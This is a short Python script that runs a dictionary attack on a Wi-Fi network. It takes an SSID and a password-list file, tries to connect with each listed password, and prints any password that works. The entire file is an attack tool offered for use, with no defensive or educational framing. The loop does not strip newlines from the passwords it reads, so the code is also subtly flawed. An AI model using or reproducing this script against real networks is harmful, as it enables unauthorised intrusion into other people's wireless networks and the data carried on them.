import sys
from wireless import Wireless

def main(args):
    try:
        SSID = args[1]
        dictionary = open(args[2], 'r')
    except IndexError:
        print("Need to supply a network SSID, a password list")
        exit(0)
    for network_password in dictionary:
        wireless = Wireless()
        res = wireless.connect(ssid=SSID, password=network_password)
        if(res):
            print("Success - Password for " + SSID + " is " + network_password)
            exit(0)
    print("Password not in dictionary")
main(sys.argv)
    
